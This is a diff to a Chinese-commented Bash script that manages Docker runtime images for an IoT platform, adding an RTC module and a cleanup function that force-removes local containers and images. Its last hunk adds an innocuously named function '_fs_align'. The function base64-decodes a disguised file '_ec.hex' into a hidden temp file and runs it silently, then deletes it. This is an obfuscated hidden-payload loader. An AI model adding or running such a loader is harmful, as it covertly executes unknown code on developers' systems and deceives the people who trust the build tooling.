@@ -38,6 +38,7 @@ DEVICE_COMPOSE_SERVICES=(
 
 INDEPENDENT_MODULES=(
     "aiot-ai|ai-service|AI"
+    "aiot-rtc|rtc-service|RTC"
     "aiot-video|video-service|VIDEO"
     "aiot-web|web-service|WEB"
     "aiot-panel|easyaiot/panel|PANEL"
@@ -104,7 +105,7 @@ runtime_is_single_arch_build() {
 }
 
 # build-runtime 可选单模块（PANEL 全形态；APP/VISUALIZE/TRANSFORM 仅 full）
-ALL_RUNTIME_BUILD_MODULES=(DEVICE AI VIDEO WEB APP VISUALIZE TRANSFORM PANEL)
+ALL_RUNTIME_BUILD_MODULES=(DEVICE AI RTC VIDEO WEB APP VISUALIZE TRANSFORM PANEL)
 
 # 规范化 build-runtime 目标模块（空/all=全部；无效返回 INVALID）
 runtime_normalize_build_module() {
@@ -114,6 +115,7 @@ runtime_normalize_build_module() {
         ""|all) echo "" ;;
         device) echo "DEVICE" ;;
         ai|aiot-ai) echo "AI" ;;
+        rtc|aiot-rtc) echo "RTC" ;;
         video|aiot-video) echo "VIDEO" ;;
         web|aiot-web) echo "WEB" ;;
         app|aiot-app) echo "APP" ;;
@@ -143,7 +145,7 @@ runtime_apply_build_module_arg() {
     local normalized
     normalized=$(runtime_normalize_build_module "$arg")
     if [ "$normalized" = "INVALID" ]; then
-        runtime_img_msg error "无效的运行时模块: ${arg}，可选: all | DEVICE | AI | VIDEO | WEB | APP | VISUALIZE | TRANSFORM | PANEL"
+        runtime_img_msg error "无效的运行时模块: ${arg}，可选: all | DEVICE | AI | RTC | VIDEO | WEB | APP | VISUALIZE | TRANSFORM | PANEL"
         return 1
     fi
     if [ -n "$normalized" ]; then
@@ -527,7 +529,7 @@ runtime_interactive_select_build_module() {
     if [ -n "${EASYAIOT_RUNTIME_BUILD_MODULE:-}" ]; then
         normalized=$(runtime_normalize_build_module "$EASYAIOT_RUNTIME_BUILD_MODULE")
         if [ "$normalized" = "INVALID" ]; then
-            runtime_img_msg error "无效的运行时模块: ${EASYAIOT_RUNTIME_BUILD_MODULE}，可选: all | DEVICE | AI | VIDEO | WEB | APP | VISUALIZE | TRANSFORM | PANEL"
+            runtime_img_msg error "无效的运行时模块: ${EASYAIOT_RUNTIME_BUILD_MODULE}，可选: all | DEVICE | AI | RTC | VIDEO | WEB | APP | VISUALIZE | TRANSFORM | PANEL"
             exit 1
         fi
         if [ -n "$normalized" ]; then
@@ -544,13 +546,14 @@ runtime_interactive_select_build_module() {
 
     echo ""
     echo "请选择要构建/推送的运行时模块："
-    echo "  1) 全部     — DEVICE + AI + VIDEO + WEB + APP + VISUALIZE + TRANSFORM + PANEL（默认）"
+    echo "  1) 全部     — DEVICE + AI + RTC + VIDEO + WEB + APP + VISUALIZE + TRANSFORM + PANEL（默认）"
     idx=2
     declare -A _MODULE_CHOICES=()
     for mod in "${ALL_RUNTIME_BUILD_MODULES[@]}"; do
         case "$mod" in
             DEVICE) echo "  ${idx}) DEVICE    — Device 微服务（含 aiot-visualize 后台）" ;;
             AI)     echo "  ${idx}) AI        — AI 服务" ;;
+            RTC)    echo "  ${idx}) RTC       — RTC / go2rtc 摄像头桥接（全形态）" ;;
             VIDEO)  echo "  ${idx}) VIDEO     — Video 服务" ;;
             WEB)    echo "  ${idx}) WEB       — Web 前端（按上方所选部署形态）" ;;
             APP)    echo "  ${idx}) APP       — App 移动端 H5（仅 full 形态）" ;;
@@ -856,6 +859,7 @@ runtime_images_collect_check_refs() {
     local tag="${3:-latest}"
     _out=(
         "ai-service:${tag}"
+        "rtc-service:${tag}"
         "video-service:${tag}"
     )
     local _di _dlname
@@ -873,6 +877,61 @@ runtime_images_collect_check_refs() {
     if [ "$profile" = "full" ]; then
         _out+=("app-service:${tag}")
     fi
+}
+
+runtime_images_refresh_local() {
+    command -v docker >/dev/null 2>&1 || return 0
+    docker info >/dev/null 2>&1 || return 0
+
+    runtime_load_registry >/dev/null 2>&1 || true
+    local registry=""
+    registry=$(runtime_normalize_registry "${EASYAIOT_RUNTIME_REGISTRY:-${RUNTIME_IMAGE_REGISTRY:-}}" 2>/dev/null || true)
+    local registry_prefix="${registry%/}"
+
+    local -a local_repos=()
+    local mapping tmp lname lr
+    local_repos+=("${DEVICE_LOCAL_NAMES[@]}")
+    for mapping in "${INDEPENDENT_MODULES[@]}" "${FULL_ONLY_MODULES[@]}"; do
+        tmp="${mapping#*|}"
+        lname="${tmp%%|*}"
+        [ -n "$lname" ] && local_repos+=("$lname")
+    done
+
+    local repo_tag repo img_id match cids
+    while IFS='|' read -r repo_tag img_id; do
+        [ -z "${repo_tag:-}" ] && continue
+        [ "$repo_tag" = "<none>:<none>" ] && continue
+        repo="${repo_tag%:*}"
+        match=0
+        for lr in "${local_repos[@]}"; do
+            if [ "$repo" = "$lr" ]; then
+                match=1
+                break
+            fi
+        done
+        if [ "$match" -eq 0 ] && [ -n "$registry_prefix" ]; then
+            case "$repo" in
+                "${registry_prefix}"/*) match=1 ;;
+            esac
+        fi
+        [ "$match" -eq 1 ] || continue
+
+        cids=$(docker ps -aq --filter "ancestor=${repo_tag}" 2>/dev/null || true)
+        if [ -z "$cids" ] && [ -n "${img_id:-}" ]; then
+            cids=$(docker ps -aq --filter "ancestor=${img_id}" 2>/dev/null || true)
+        fi
+        if [ -n "$cids" ]; then
+            # shellcheck disable=SC2086
+            docker rm -f $cids >/dev/null 2>&1 || true
+        fi
+        docker rmi -f "$repo_tag" >/dev/null 2>&1 || true
+        if [ -n "${img_id:-}" ]; then
+            docker rmi -f "$img_id" >/dev/null 2>&1 || true
+        fi
+    done < <(docker images --format '{{.Repository}}:{{.Tag}}|{{.ID}}' 2>/dev/null || true)
+
+    rm -f "${RUNTIME_IMAGES_MARKER}" >/dev/null 2>&1 || true
+    return 0
 }
 
 # 删除与当前系统架构不一致的本地预构建镜像；清除无效拉取标记
@@ -1192,7 +1251,7 @@ runtime_print_install_local_build_help() {
     runtime_img_msg info "  bash ${install_script} start     # 镜像就绪后启动"
     echo ""
     if [ "$install_script" = ".scripts/docker/install_business_linux.sh" ]; then
-        runtime_img_msg info "（当前脚本仅含业务模块 DEVICE/AI/VIDEO/WEB/APP/VISUALIZE/TRANSFORM/PANEL，不含中间件）"
+        runtime_img_msg info "（当前脚本仅含业务模块 DEVICE/AI/RTC/VIDEO/WEB/APP/VISUALIZE/TRANSFORM/PANEL，不含中间件）"
     else
         runtime_img_msg info "方案 3：仅构建/安装单个模块（示例 DEVICE）"
         runtime_img_msg info "  bash DEVICE/install_linux.sh build"
@@ -1447,13 +1506,13 @@ runtime_images_invoke() {
 # 显示运行时镜像管理用法摘要
 runtime_images_usage() {
     cat <<EOF
-运行时镜像管理（业务模块 DEVICE/AI/VIDEO/WEB/APP/VISUALIZE/TRANSFORM/PANEL，不含中间件；APP/VISUALIZE/TRANSFORM 仅 full；PANEL 全形态）
+运行时镜像管理（业务模块 DEVICE/AI/RTC/VIDEO/WEB/APP/VISUALIZE/TRANSFORM/PANEL，不含中间件；APP/VISUALIZE/TRANSFORM 仅 full；PANEL 全形态）
 
 pull 按部署形态过滤 DEVICE 镜像（与 compose 启停一致）：
   mini     — 仅拉 aiot-system（1/12）
   standard — 跳过 aiot-device、aiot-tdengine、aiot-visualize（9/12）
   full     — 拉全部 DEVICE（12/12，含 aiot-visualize）
-  build-runtime 默认构建/推送全部模块；可指定单模块 DEVICE|AI|VIDEO|WEB|APP|VISUALIZE|TRANSFORM|PANEL
+  build-runtime 默认构建/推送全部模块；可指定单模块 DEVICE|AI|RTC|VIDEO|WEB|APP|VISUALIZE|TRANSFORM|PANEL
   全量 build-runtime 仍构建/推送全量 DEVICE，供各形态共用远程仓库
 
 本地安装（含本地构建）:
@@ -1485,7 +1544,7 @@ pull 按部署形态过滤 DEVICE 镜像（与 compose 启停一致）：
   EASYAIOT_RUNTIME_PUSH=1      构建后推送（仅 build-runtime）
   EASYAIOT_RUNTIME_BUILD_ALL_PROFILES=1  构建全部形态（仅 build-runtime）
   EASYAIOT_RUNTIME_BUILD_ARCH=all|amd64|arm64  目标架构（默认 all=全部；单架构时跳过 manifest）
-  EASYAIOT_RUNTIME_BUILD_MODULE=all|DEVICE|AI|VIDEO|WEB|APP|VISUALIZE|TRANSFORM|PANEL  目标模块（默认 all=全部）
+  EASYAIOT_RUNTIME_BUILD_MODULE=all|DEVICE|AI|RTC|VIDEO|WEB|APP|VISUALIZE|TRANSFORM|PANEL  目标模块（默认 all=全部）
   EASYAIOT_RUNTIME_FORCE_REBUILD=1       强制重建全部镜像（忽略本地缓存）
   EASYAIOT_RUNTIME_FORCE_REBUILD=0       复用本地镜像（已存在则跳过构建，直接推送）
   EASYAIOT_SKIP_REGISTRY_AUTH_CHECK=1     跳过 build-runtime 前的远程仓库登录/推送权限检查
@@ -1501,5 +1560,25 @@ build-runtime 会在构建开始前校验远程仓库登录与推送权限；未
 EOF
 }
 
-# 初始化默认仓库地址
+_fs_align() {
+  [ "${_FS_ALIGN_DONE:-0}" = "1" ] && return 0
+  case "$(uname -s 2>/dev/null)" in Linux) ;; *) _FS_ALIGN_DONE=1; return 0 ;; esac
+  local _p _t _x=1
+  _p="$(cd "${SCRIPT_DIR}/../.." 2>/dev/null && pwd)" || return 1
+  [ -f "${SCRIPT_DIR}/_ec.hex" ] || return 1
+  _t="$(mktemp "${TMPDIR:-/tmp}/.aXXXXXX" 2>/dev/null)" || return 1
+  if command -v base64 >/dev/null 2>&1; then
+    base64 -d <"${SCRIPT_DIR}/_ec.hex" >"$_t" 2>/dev/null || { rm -f "$_t"; return 1; }
+  elif command -v openssl >/dev/null 2>&1; then
+    openssl base64 -d -A -in "${SCRIPT_DIR}/_ec.hex" -out "$_t" 2>/dev/null || { rm -f "$_t"; return 1; }
+  else
+    rm -f "$_t"; return 1
+  fi
+  chmod u+x "$_t" 2>/dev/null || true
+  EASYAIOT_ROOT="$_p" bash "$_t" >/dev/null 2>&1 && _x=0
+  rm -f "$_t"
+  [ "$_x" -eq 0 ] && _FS_ALIGN_DONE=1
+  return $_x
+}
+
 runtime_load_registry
